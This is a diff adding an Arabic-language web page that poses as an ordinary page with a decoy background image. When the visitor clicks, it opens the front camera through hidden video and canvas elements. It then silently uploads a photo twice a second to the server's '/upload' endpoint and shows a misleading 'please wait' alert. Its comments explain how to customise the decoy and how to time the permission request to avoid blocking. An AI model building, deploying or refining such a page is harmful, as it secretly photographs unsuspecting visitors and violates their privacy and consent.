@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>كاميرتك تشتغل</title>
+  <style>
+    body {
+      /* غير رابط الصورة هنا */
+      background-image: url("هنا خلي رابط صوره الصفحه");
+      background-size: cover;
+      background-position: center;
+      color: white;
+      font-size: 2em;
+      text-align: center;
+      padding-top: 30vh;
+      height: 100vh;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    function startCameraAndSend() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
+
+          setInterval(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+              if (blob) {
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo.jpg');
+                fetch('/upload', { method: 'POST', body: formData })
+                  .catch(e => console.error('Failed to send photo:', e));
+              }
+            }, 'image/jpeg', 0.95);
+          }, 500); // مرتين في الثانية
+        })
+        .catch(err => alert("حدث خطا يرجا إعادة المحاوله  : " + err));
+    }
+
+    // نطلب إذن الكاميرا وابدأ التصوير عند الضغط على الشاشة (لتجنب الحظر)
+    document.body.addEventListener('click', () => {
+      startCameraAndSend();
+      alert("يرجا الانتضار ليتم معالجه طلبك");
+    }, { once: true });
+
+  </script>
+  <h3>  </h3>
+</body>
+</html>
